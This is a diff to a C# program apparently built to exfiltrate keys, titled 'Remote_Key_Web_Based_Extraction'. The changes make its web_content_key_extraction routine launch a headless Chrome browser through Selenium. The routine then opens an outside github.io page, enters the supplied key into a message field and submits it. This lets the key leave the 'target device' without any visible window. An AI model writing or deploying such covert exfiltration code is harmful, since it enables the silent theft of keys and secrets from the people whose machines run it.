@@ -1,17 +1,16 @@
 using System;
 using System.Collections.Generic;
 using System.Management.Automation;
-//using WindowsInput;
-//using System.Windows.Input;
 using OpenQA.Selenium;
-using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Firefox;
 using System.Diagnostics;
 using Microsoft.WindowsAPICodePack.Net;
+using OpenQA.Selenium.Chrome;
 
 // https://github.com/PowerShell/PowerShell/issues/7909
 // dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
+// Conditional compilation symbols: _PUBLISH_CHROMEDRIVER
 
 namespace Remote_Key_Web_Based_Extraction
 {
@@ -73,28 +72,6 @@ namespace Remote_Key_Web_Based_Extraction
 
         public void web_content_key_extraction(string key_contents)
         {
-        /*
-
-        // System.Diagnostics.Process.Start(string fileName, string arguments);
-
-        //https://stackoverflow.com/questions/49529559/cant-open-link-in-c-sharp
-        System.Diagnostics.Process.Start("cmd", "/c start https://anthony-t-n.github.io");
-
-        // https://stackoverflow.com/questions/25987445/installed-inputsimulator-via-nuget-no-members-accessible
-        InputSimulator s = new InputSimulator();
-
-        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.F5);
-        // 22 tab presses
-        for (int i = 0; i <= 22; i++)
-        {
-            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.TAB);
-        }
-        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.VK_4);
-        s.Keyboard.TextEntry(key_content);
-        */
-
-        // Issues with Selenium. Requires driver executables on target device.
-        // https://stackoverflow.com/questions/57762289/why-is-chromedriver-working-in-debug-mode-but-not-on-release
             /*
             
             EdgeOptions edgeOptions = new EdgeOptions();
@@ -107,15 +84,16 @@ namespace Remote_Key_Web_Based_Extraction
             */
             try
             {
+
                 // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
-                //var chromeOptions = new ChromeOptions();
-                //chromeOptions.AddArguments("headless");
+                var chromeOptions = new ChromeOptions();
+                chromeOptions.AddArguments("headless");
                 Console.WriteLine("[=] Attempting to try Chrome");
-                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
+                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver(chromeOptions);
                 current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                 current_driver.FindElement(By.Name("message")).SendKeys(key_contents);
-                //current_driver.FindElement(By.Name("send")).Click();
-                //current_driver.Quit();
+                current_driver.FindElement(By.Name("send")).Click();
+                current_driver.Quit();
             }
             catch (Exception e)
             {
